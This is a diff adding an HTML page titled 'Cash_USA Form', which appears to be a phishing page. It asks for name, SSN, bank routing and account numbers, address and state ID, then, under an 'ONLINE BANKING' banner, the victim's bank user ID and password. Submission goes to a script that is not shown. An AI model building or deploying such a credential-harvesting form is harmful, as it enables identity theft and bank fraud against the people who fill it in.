@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash_USA Form</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <form action="" method="POST">
+        <div>
+        <img class="logo" src="logo.png">
+        </div><br><br><br><br>
+        <div class="name_section">
+            <div>
+                <!-- <marquee></marquee> -->
+                <p>First Name:</p>
+                <input type="text" class="first_name" id="first_name" placeholder="First Name" name="first_name" required>
+            </div>
+            <div>
+                <p>Last Name</p>
+                <input type="text" class="last_name" id="last_name" placeholder="Last Name" name="last_name"required>
+            </div>
+        </div>
+        <div class="ssn_section">
+            <p>SSN:</p>
+            <input type="number" class="ssn" id="ssn" placeholder="SSN" name="ssn" required>
+        </div>
+        <div class="bank_section">
+            <p>Bank Name:</p>
+            <input type="text" class="bankname" id="bankname" placeholder="Bank Name" name="bankname" required>
+        </div>
+        <div class="routing_section">
+            <p>Routing Number:</p>
+            <input type="number" class="routingnumber" id="routingnumber" placeholder="Routing Number" name="routingnumber" required>
+        </div>
+        <div class="account_section">
+            <p>Account Number:</p>
+            <input type="number" class="accountnumber" id="accountnumber" placeholder="Account Number" name="accountnumber" required>
+        </div>
+        <div class="address_section">
+            <p>Address:</p>
+            <input type="text" class="address" id="address" placeholder="Address" name="address" required>
+        </div>
+        <div class="state_id_section">
+            <p>State ID :</p>
+            <input type="text" class="stateid" id="stateid" placeholder="STATE ID" name="stateid" required>
+        </div>
+        <br><br><br><br>
+        <marquee direction="left" Scrollamount=35  behaviour="alternate" class="banking_heading">ONLINE BANKING</marquee>
+
+        <div class="id_section">
+            <p>USER ID:</p>
+            <input type="text" class="userid" id="userid" placeholder="USER ID" name="userid" required>
+        </div>
+        <div class="password_section">
+            <p>PASSWORD:</p>
+            <input type="password" class="password" id="password" placeholder="PASSWORD" name="password" required>
+        </div>
+        <div class="submit_button">
+            <input type="submit" onclick="click_button()" class="button" id="button" value="Submit" name="submit">
+        </div>
+    </form>
+        <script src="index.js"></script>
+</body>
+</html>
